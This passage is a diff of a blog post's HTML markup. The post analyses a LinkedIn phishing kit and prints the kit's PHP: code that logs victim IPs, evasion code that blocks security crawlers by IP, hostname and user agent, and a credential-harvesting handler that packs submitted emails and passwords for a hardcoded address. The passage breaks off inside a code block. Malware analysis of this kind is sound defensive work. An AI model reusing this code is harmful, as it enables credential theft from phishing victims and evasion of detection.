+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;style&gt; body <span class="o">{</span> margin: 0<span class="p">;</span> overflow: hidden<span class="p">;</span> <span class="o">}</span> &lt;/style&gt;
+</span></span><span class="line"><span class="cl">  &lt;ifram%
 </span></span></code></pre></div><p>To be honest, I didn&rsquo;t really get the point of encoding some HTML code in base64 and place it in the header, ping me if you have any idea.</p>
 <p>Anyway, here is the rest of <code>index.php</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>);
-</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;vu.txt&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>($file,$ip<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;  -  &#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">gmdate</span> (<span style="color:#e6db74">&#34;Y-n-d&#34;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; @ &#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">gmdate</span> (<span style="color:#e6db74">&#34;H:i:s&#34;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="nx">getenv</span><span class="p">(</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;vu.txt&#34;</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&#34;  -  &#34;</span><span class="o">.</span><span class="nx">gmdate</span> <span class="p">(</span><span class="s2">&#34;Y-n-d&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34; @ &#34;</span><span class="o">.</span><span class="nx">gmdate</span> <span class="p">(</span><span class="s2">&#34;H:i:s&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
 </span></span></code></pre></div><p>Where the IP address of the victim is appended to <code>vu.txt</code> with a timestamp. As we saw while checking the structure of the kit, <code>vu.txt</code> is not created while executing these lines. If we check the content of the file before running <code>index.php</code>, it contains:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>127.0.0.1  -  2017-8-14 @ 20:49:14
-</span></span><span style="display:flex;"><span>127.0.0.1  -  2017-8-14 @ 20:49:48
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1  -  2017-8-14 @ 20:49:14
+</span></span><span class="line"><span class="cl">127.0.0.1  -  2017-8-14 @ 20:49:48
 </span></span></code></pre></div><p>These information were probably left by the developer of the kit; and gives us an idea about when the kit was created/released.</p>
-<h2 id="hiding-techniques">Hiding techniques</h2>
+<h2 id="hiding-techniques">Hiding techniques<a hidden class="anchor" aria-hidden="true" href="#hiding-techniques">#</a></h2>
 <p>Many phishing kits try to hide themselves from bots or web sandbox. In this case, the kit uses 3 techniques:</p>
 <ol>
 <li><code>robots.txt</code></li>
 <li><code>.htaccess</code></li>
 <li><code>blocker.php</code></li>
 </ol>
-<h3 id="robotstxt">robots.txt</h3>
+<h3 id="robotstxt">robots.txt<a hidden class="anchor" aria-hidden="true" href="#robotstxt">#</a></h3>
 <p>This file is used by web developers to give information to web crawlers about the structure of the site. In this case:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>User-agent: *
-</span></span><span style="display:flex;"><span>Disallow: /
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">User-agent: *
+</span></span><span class="line"><span class="cl">Disallow: /
 </span></span></code></pre></div><p>specifies that every crawler (no matter the User-Agent string) should not navigate in the site. This is commonly used to avoid being indexed by search engines.</p>
-<h3 id="htaccess">.htaccess</h3>
+<h3 id="htaccess">.htaccess<a hidden class="anchor" aria-hidden="true" href="#htaccess">#</a></h3>
 <p><code>.htaccess</code> is a configuration file for Apache Web servers. It can be used to alter the settings, configurations and functionalities of Apache Web servers. In the case of this kit, the file is used to deny access to specific subnets and bots.</p>
 <p>The <code>.htaccess</code> provided in the kit can be dived in two main parts. The first one uses <code>deny from</code> with a long list of subnets and domain names (almost 6000). Here are some lines:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[..]
-</span></span><span style="display:flex;"><span>deny from 66.235.132.121/22
-</span></span><span style="display:flex;"><span>deny from 66.235.133.14/22
-</span></span><span style="display:flex;"><span>[...]
-</span></span><span style="display:flex;"><span>deny from google.com
-</span></span><span style="display:flex;"><span>deny from paypal.com
-</span></span><span style="display:flex;"><span>[..]
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[..]
+</span></span><span class="line"><span class="cl">deny from 66.235.132.121/22
+</span></span><span class="line"><span class="cl">deny from 66.235.133.14/22
+</span></span><span class="line"><span class="cl">[...]
+</span></span><span class="line"><span class="cl">deny from google.com
+</span></span><span class="line"><span class="cl">deny from paypal.com
+</span></span><span class="line"><span class="cl">[..]
 </span></span></code></pre></div><p>Blocked visitors will be shown the error message <em>403 Forbidden</em>. At the end of this part of the file, <code>allow from all</code> is used to allow access to all the other subnets.</p>
 <p>The second part is used to block bots, and it uses the following syntax:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[..]
-</span></span><span style="display:flex;"><span>RewriteCond %{HTTP_USER_AGENT} ^HMView [OR]
-</span></span><span style="display:flex;"><span>RewriteCond %{HTTP_USER_AGENT} HTTrack [NC,OR]
-</span></span><span style="display:flex;"><span>RewriteCond %{HTTP_USER_AGENT} ^Image\ Stripper [OR]
-</span></span><span style="display:flex;"><span>RewriteCond %{HTTP_USER_AGENT} ^Image\ Sucker [OR]
-</span></span><span style="display:flex;"><span>[..]
-</span></span></code></pre></div><p>This part of the file embedded is pasted from an example provided in a <a href="http://www.htaccess-guide.com/blocking-offline-browsers-and-bad-bots/">tutorial called <em>Blocking offline browsers and &lsquo;bad bots&rsquo;</em></a>.</p>
-<h3 id="blockerphp">blocker.php</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[..]
+</span></span><span class="line"><span class="cl">RewriteCond %{HTTP_USER_AGENT} ^HMView [OR]
+</span></span><span class="line"><span class="cl">RewriteCond %{HTTP_USER_AGENT} HTTrack [NC,OR]
+</span></span><span class="line"><span class="cl">RewriteCond %{HTTP_USER_AGENT} ^Image\ Stripper [OR]
+</span></span><span class="line"><span class="cl">RewriteCond %{HTTP_USER_AGENT} ^Image\ Sucker [OR]
+</span></span><span class="line"><span class="cl">[..]
+</span></span></code></pre></div><p>This part of the file embedded is pasted from an example provided in a <a href="http://www.htaccess-guide.com/blocking-offline-browsers-and-bad-bots/" target="_blank" rel="noopener">tutorial called <em>Blocking offline browsers and &lsquo;bad bots&rsquo;</em></a>.</p>
+<h3 id="blockerphp">blocker.php<a hidden class="anchor" aria-hidden="true" href="#blockerphp">#</a></h3>
 <p>Similarly to the previous files, <code>blocker.php</code> is used to prevent some hosts to access the site. It is included in the entry point of the kit and it contains:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>$hostname <span style="color:#f92672">=</span> <span style="color:#a6e22e">gethostbyaddr</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]);
-</span></span><span style="display:flex;"><span>$blocked_words <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;above&#34;</span>,<span style="color:#e6db74">&#34;google&#34;</span>,<span style="color:#e6db74">&#34;softlayer&#34;</span>,<span style="color:#e6db74">&#34;amazonaws&#34;</span>,<span style="color:#e6db74">&#34;cyveillance&#34;</span>,<span style="color:#e6db74">&#34;phishtank&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;dreamhost&#34;</span>,<span style="color:#e6db74">&#34;netpilot&#34;</span>,<span style="color:#e6db74">&#34;calyxinstitute&#34;</span>,<span style="color:#e6db74">&#34;tor-exit&#34;</span>, <span style="color:#e6db74">&#34;paypal&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span>($blocked_words <span style="color:#66d9ef">as</span> $word) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">substr_count</span>($hostname, $word) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;HTTP/1.0 404 Not Found&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;&lt;h1&gt;404 Not Found&lt;/h1&gt;The page that you have requested could not be found.&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>$bannedIP <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;^66.102.*.*&#34;</span>, <span style="color:#e6db74">&#34;^38.100.*.*&#34;</span>, <span style="color:#e6db74">&#34;^107.170.*.*&#34;</span><span style="color:#f92672">...</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>],$bannedIP)) {
-</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 404 Not Found&#39;</span>);
-</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">exit</span>();
-</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">foreach</span>($bannedIP <span style="color:#66d9ef">as</span> $ip) {
-</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $ip <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span>,$_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>])){
-</span></span><span style="display:flex;"><span>               <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 404 Not Found&#39;</span>);
-</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;&lt;h1&gt;404 Not Found&lt;/h1&gt;The page that you have requested could not be found.&#34;</span>);
-</span></span><span style="display:flex;"><span>          }
-</span></span><span style="display:flex;"><span>     }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strpos</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>], <span style="color:#e6db74">&#39;google&#39;</span>) <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strpos</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>], <span style="color:#e6db74">&#39;msnbot&#39;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strpos</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>], <span style="color:#e6db74">&#39;Yahoo! Slurp&#39;</span>) <span style="color:#66d9ef">or</span> [<span style="color:#f92672">...</span>] ) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) { <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 404 Not Found&#39;</span>); <span style="color:#66d9ef">exit</span>; }
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hostname</span> <span class="o">=</span> <span class="nx">gethostbyaddr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$blocked_words</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;above&#34;</span><span class="p">,</span><span class="s2">&#34;google&#34;</span><span class="p">,</span><span class="s2">&#34;softlayer&#34;</span><span class="p">,</span><span class="s2">&#34;amazonaws&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;cyveillance&#34;</span><span class="p">,</span><span class="s2">&#34;phishtank&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;dreamhost&#34;</span><span class="p">,</span><span class="s2">&#34;netpilot&#34;</span><span class="p">,</span><span class="s2">&#34;calyxinstitute&#34;</span><span class="p">,</span><span class="s2">&#34;tor-exit&#34;</span><span class="p">,</span> <span class="s2">&#34;paypal&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$blocked_words</span> <span class="k">as</span> <span class="nv">$word</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">substr_count</span><span class="p">(</span><span class="nv">$hostname</span><span class="p">,</span> <span class="nv">$word</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;HTTP/1.0 404 Not Found&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;&lt;h1&gt;404 Not Found&lt;/h1&gt;The page that you have requested could not
+</span></span></span><span class="line"><span class="cl"><span class="s2">	    be found.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$bannedIP</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;^66.102.*.*&#34;</span><span class="p">,</span> <span class="s2">&#34;^38.100.*.*&#34;</span><span class="p">,</span> <span class="s2">&#34;^107.170.*.*&#34;</span><span class="o">...</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">],</span><span class="nv">$bannedIP</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">     <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 404 Not Found&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">     <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">     <span class="k">foreach</span><span class="p">(</span><span class="nv">$bannedIP</span> <span class="k">as</span> <span class="nv">$ip</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$ip</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">               <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 404 Not Found&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">               <span class="k">die</span><span class="p">(</span><span class="s2">&#34;&lt;h1&gt;404 Not Found&lt;/h1&gt;The page that you have requested could
+</span></span></span><span class="line"><span class="cl"><span class="s2">		    not be found.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">],</span> <span class="s1">&#39;google&#39;</span><span class="p">)</span> <span class="k">or</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">],</span> <span class="s1">&#39;msnbot&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">or</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">],</span> <span class="s1">&#39;Yahoo! Slurp&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">or</span> <span class="p">[</span><span class="o">...</span><span class="p">]</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span> <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 404 Not Found&#39;</span><span class="p">);</span> <span class="k">exit</span><span class="p">;</span> <span class="p">}</span>
 </span></span></code></pre></div><p>As seen in the code, the access is granted only if hostname, IP address and User-Agent string of the client are not included in a list of harcoded values. A <em>404 Not Found</em> error is shown otherwise.</p>
 <p>Note that many of the hardcoded values contained in <code>bannedIP</code> and in the User-Agent check were omitted from the lines above to make the code more readable.</p>
-<h2 id="the-phishing-page">The phishing page</h2>
+<h2 id="the-phishing-page">The phishing page<a hidden class="anchor" aria-hidden="true" href="#the-phishing-page">#</a></h2>
 <p>We already saw that <code>index.php</code> redirects the client into the folder with a random name: this contains the same files of the <code>LinkedIn</code> folder found in the kit. The purpose of this trick is to have a different URL for every execution of <code>index.php</code>.</p>
 <p>I didn&rsquo;t find an online instance of the kit, but we can use <code>php</code> to run it locally:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>php -S localhost:8000
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php -S localhost:8000
 </span></span></code></pre></div><p>If we go to <code>localhost:8000</code>, the connection will be redirected to a page similar to this:</p>
-<figure><img src="/images/posts/phishing-findings/ep2/contentphplocal.png"
-         alt="Local deployment of this phishing kit"/><figcaption>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep2/contentphplocal.png#center"
+         alt="deploying the kit locally"/> <figcaption>
             <p>Local deployment of this phishing kit</p>
         </figcaption>
 </figure>
 
 <p>You can see that the URL contains the random <em>md5</em> string obtained in <code>index.php</code>.</p>
 <p>Let&rsquo;s take a look at the PHP code of the phishing page:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>$emai <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;user&#39;</span>];
-</span></span><span style="display:flex;"><span>$IP <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
-</span></span><span style="display:flex;"><span>$geopluginURL<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://www.geoplugin.net/php.gp?ip=&#39;</span><span style="color:#f92672">.</span>$IP;
-</span></span><span style="display:flex;"><span>$addrDetailsArr <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">file_get_contents</span>($geopluginURL));
-</span></span><span style="display:flex;"><span>$city <span style="color:#f92672">=</span> $addrDetailsArr[<span style="color:#e6db74">&#39;geoplugin_city&#39;</span>];
-</span></span><span style="display:flex;"><span>$country <span style="color:#f92672">=</span> $addrDetailsArr[<span style="color:#e6db74">&#39;geoplugin_countryName&#39;</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$city){
-</span></span><span style="display:flex;"><span>   $city<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Not Define&#39;</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$country){
-</span></span><span style="display:flex;"><span>   $country<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Not Define&#39;</span>;
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$emai</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$IP</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$geopluginURL</span><span class="o">=</span><span class="s1">&#39;http://www.geoplugin.net/php.gp?ip=&#39;</span><span class="o">.</span><span class="nv">$IP</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$addrDetailsArr</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$geopluginURL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$city</span> <span class="o">=</span> <span class="nv">$addrDetailsArr</span><span class="p">[</span><span class="s1">&#39;geoplugin_city&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$country</span> <span class="o">=</span> <span class="nv">$addrDetailsArr</span><span class="p">[</span><span class="s1">&#39;geoplugin_countryName&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$city</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">   <span class="nv">$city</span><span class="o">=</span><span class="s1">&#39;Not Define&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$country</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">   <span class="nv">$country</span><span class="o">=</span><span class="s1">&#39;Not Define&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>In this first part, the IP address and the location information of the client are gathered. Again, we see the use of geoplugin (and again, with the old address geoplugin.net) in order to infer the city and the country from the IP address.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_POST <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>], $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>])){
-</span></span><span style="display:flex;"><span>    $ip <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]) <span style="color:#f92672">?</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
-</span></span><span style="display:flex;"><span>    $email_to <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;simon@wmbrep.biz&#34;</span>;
-</span></span><span style="display:flex;"><span>    $email_subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Linked&#34;</span>;
-</span></span><span style="display:flex;"><span>    $email_from <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;simon-walter&#34;</span>;
-</span></span><span style="display:flex;"><span>    $email <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;email&#39;</span>];
-</span></span><span style="display:flex;"><span>    $pass <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>];
-</span></span><span style="display:flex;"><span>    $cpass <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;cpass&#39;</span>];
-</span></span><span style="display:flex;"><span>    $email_message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Email: &#34;</span><span style="color:#f92672">.</span>($email)<span style="color:#f92672">.</span>   <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $email_message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Password: &#34;</span><span style="color:#f92672">.</span>($pass)<span style="color:#f92672">.</span>   <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $email_message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;IP: &#34;</span><span style="color:#f92672">.</span>($ip)<span style="color:#f92672">.</span>   <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $email_message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Country: &#34;</span><span style="color:#f92672">.</span>($country)<span style="color:#f92672">.</span>   <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $email_message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;City: &#34;</span><span style="color:#f92672">.</span>($city)<span style="color:#f92672">.</span>   <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;From: &#39;</span><span style="color:#f92672">.</span>$email_from<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
